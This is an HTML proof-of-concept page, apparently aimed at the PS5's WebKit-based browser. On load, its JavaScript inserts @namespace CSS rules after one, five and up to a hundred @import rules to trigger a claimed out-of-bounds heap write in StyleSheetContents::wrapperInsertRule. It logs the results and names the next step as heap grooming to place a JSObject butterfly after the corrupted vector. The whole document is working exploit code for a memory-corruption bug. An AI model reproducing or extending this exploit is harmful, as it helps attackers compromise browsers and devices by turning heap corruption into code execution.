<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 Bug 1 - wrapperInsertRule OOB Write</title>
<style id="sheet">
@import url("data:text/css,body{}");
</style>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting wrapperInsertRule OOB Write test...');

// Bug: StyleSheetContents::wrapperInsertRule uses global `index` instead of
// adjusted `childVectorIndex` when inserting @namespace rules.
//
// If we have @import rules, the global index is offset by the import count.
// Inserting @namespace at index 1 (after one @import) means:
//   childVectorIndex = 1 - 1 = 0  (correct local index)
//   but the code inserts at index 1 (global) into an empty m_namespaceRules vector
//   => OOB write at position 1 in a size-0 vector

const sheet = document.getElementById('sheet').sheet;
L('[*] Initial cssRules: ' + sheet.cssRules.length);

// Insert @namespace at index 1 (after the @import at index 0)
// This triggers the OOB write
try {
    sheet.insertRule('@namespace foo url(http://example.com);', 1);
    L('[+] insertRule succeeded! cssRules: ' + sheet.cssRules.length);
    L('[+] If we reached here without crash, the OOB write happened silently.');
    L('[+] Adjacent heap memory may be corrupted.');
} catch (e) {
    L('[!] insertRule threw: ' + e.message);
}

// Try with more @import rules to increase the OOB offset
L('\n--- Test 2: Multiple @import rules ---');
const sheet2 = document.createElement('style');
document.head.appendChild(sheet2);
sheet2.textContent = '';
// Add 5 @import rules
for (let i = 0; i < 5; i++) {
    try {
        sheet2.insertRule('@import url("data:text/css,body{}");', i);
    } catch(e) {}
}
L('[*] Sheet2 cssRules: ' + sheet2.cssRules.length);

// Now insert @namespace at index 5 (after all @imports)
// childVectorIndex = 5 - 5 = 0, but code inserts at index 5
// OOB write at position 5 in empty m_namespaceRules
try {
    sheet2.insertRule('@namespace bar url(http://example.com);', 5);
    L('[+] Test 2 succeeded! OOB write with offset 5.');
} catch (e) {
    L('[!] Test 2 threw: ' + e.message);
}

// Test 3: Large offset to corrupt more memory
L('\n--- Test 3: Large offset ---');
const sheet3 = document.createElement('style');
document.head.appendChild(sheet3);
for (let i = 0; i < 100; i++) {
    try {
        sheet3.insertRule('@import url("data:text/css,body{}");', i);
    } catch(e) { break; }
}
L('[*] Sheet3 cssRules: ' + sheet3.cssRules.length);

try {
    sheet3.insertRule('@namespace baz url(http://example.com);', sheet3.cssRules.length);
    L('[+] Test 3 succeeded! OOB write with offset ' + sheet3.cssRules.length + '.');
} catch (e) {
    L('[!] Test 3 threw: ' + e.message);
}

L('\n[*] Test finished.');
L('[*] If no crash, we have silent heap corruption.');
L('[*] Next step: groom heap to place a JSObject butterfly after the namespace vector.');
</script>
</body>
</html>
